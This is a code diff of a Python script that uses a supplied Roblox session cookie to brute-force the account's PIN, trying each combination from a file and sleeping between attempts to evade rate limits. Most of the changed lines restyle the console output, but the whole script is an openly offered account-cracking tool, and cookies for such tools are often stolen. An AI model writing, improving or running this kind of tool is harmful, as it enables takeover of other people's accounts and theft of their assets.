@@ -1,23 +1,47 @@
-anyerror = False
+import time, sys
+
+def print015(text):
+    for c in text:
+        sys.stdout.write(c)
+        sys.stdout.flush()
+        time.sleep(0.015)
+    sys.stdout.write("\n")
+
+def print01(text):
+    for c in text:
+        sys.stdout.write(c)
+        sys.stdout.flush()
+        time.sleep(0.015)
+
+
 try:
-  import requests
-  import colorama
+    import colorama, requests
 except:
-  anyerror = True
-if anyerror == True:
-  print("Missing Module(s), Press Enter To Start Repair Process (Wont Always Work)")
-  input("")
-  try:
-    import os
-    os.system("pip install requests")
-    os.system("pip install colorama")
-    print("Problems Should Be Fixed Now, Restart The Program")
+    sys.stdout.write("> ")
+    print015("Missing Required Modules, Press Enter To Download (May Not Always Work)")
+    input("")
+    try:
+        os.system("pip install colorama requests")
+    except:
+        pass
+    sys.stdout.write("> ")
+    print015("Problem Maybe Fixed Now, Restart The Program")
     input("")
     exit()
-  except:
-    print("Error While Fixing, Sorry")
-    input("")
-    exit()
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 try:
     import os
     from os import system
@@ -28,20 +52,26 @@ import time
 colorama.init(autoreset=True)
 while True:
     try:
-        cookie = input("Enter Cookie: ")
+        sys.stdout.write(colorama.Fore.CYAN + "> ")
+        print01("Enter Cookie: ")
+        cookie = input("")
         r = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": cookie}).json()
         break
     except:
-        print("Cookie Invalid")
+        sys.stdout.write(colorama.Fore.RED + "> ")
+        print015("Cookie Invalid")
 
 
 while True:
     try:
-        delay = input("Enter Delay In Seconds (300 Recomended): ")
+        sys.stdout.write(colorama.Fore.CYAN + "> ")
+        print01("Enter Delay In Seconds (300-500 Recomended): ")
+        delay = input("")
         delay = float(delay)
         break
     except:
-        print("Enter A Valid Choice")
+        sys.stdout.write(colorama.Fore.RED + "> ")
+        print015("Enter A Valid Choice")
 
 try:
     file = open("pin_combinations.txt", "r")
@@ -53,7 +83,8 @@ try:
         combs.append(ce)
     file.close()
 except:
-    print("Missing pin_combinations.txt File, Press Enter To Exit Program")
+    sys.stdout.write(colorama.Fore.RED + "> ")
+    print01("Missing pin_combinations.txt File, Press Enter To Exit Program")
     input("")
     exit()
 
@@ -66,12 +97,12 @@ token = str(lol.headers["x-csrf-token"])
 headers = {
     "x-csrf-token": token
 }
-
-print("If Its Not Printing Anything You May Be Rate Limtied, Its Recomended To Have 300-500 Seconds As Delay To Not Be Rate Limited, If You Was Rate Limited Before You Opend The Program Open It Agian In 5-20 Minutes")
-print("At Maximum It Can Take 833 Hours Or 34 Days Or 50,000 Minutes (At Recommended Delay)")
+sys.stdout.write(colorama.Fore.CYAN + "> ")
+print015("If Its Not Printing Anything You May Be Rate Limtied, Its Recomended To Have 300-500 Seconds As Delay To Not Be Rate Limited, If You Was Rate Limited Before You Opend The Program Open It Agian In 5-20 Minutes")
+sys.stdout.write(colorama.Fore.CYAN + "> ")
+print015("At Maximum It Can Take 833 Hours Or 34 Days Or 50,000 Minutes (At Recommended Delay)")
 
 for pin in combs:
-
     try:
         while True:
             json = {
@@ -82,17 +113,20 @@ for pin in combs:
             token = str(lol.headers["x-csrf-token"])
             re = str(re)
             if "200" in re:
-                print(colorama.Fore.GREEN + "Succsesfully Cracked Pin, Pin Is " + str(pin))
-                input("")
-                input("")
-                input("")
+                sys.stdout.write(colorama.Fore.CYAN + "> ")
+                print01("Succsesfully Cracked Pin, Pin Is " + str(pin))
+                for u in range(3):
+                    input("")
                 exit()
             if "429" in re:
-                print(colorama.Fore.RED + "Rate Limited, Sleeping For " + str(delay) + " Seconds")
+                sys.stdout.write(colorama.Fore.RED + "> ")
+                print("Rate Limited, Sleeping For " + str(delay) + " Seconds")
                 time.sleep(float(delay))
             if "403" in re:
-                print(colorama.Fore.RED + "Invalid Pin, Pin Is Not "+str(pin)+", Sleeping For " + str(delay) + " Seconds")
+                sys.stdout.write(colorama.Fore.RED + "> ")
+                print("Invalid Pin, Pin Is Not "+str(pin)+", Sleeping For " + str(delay) + " Seconds")
                 time.sleep(float(delay))
                 break
     except:
-        print(colorama.Fore.RED + "Unkown Error, Cookie May Expired, X Csrf Token May Be Invalid")
+        sys.stdout.write(colorama.Fore.RED + "> ")
+        print("Unkown Error, Cookie May Expired")
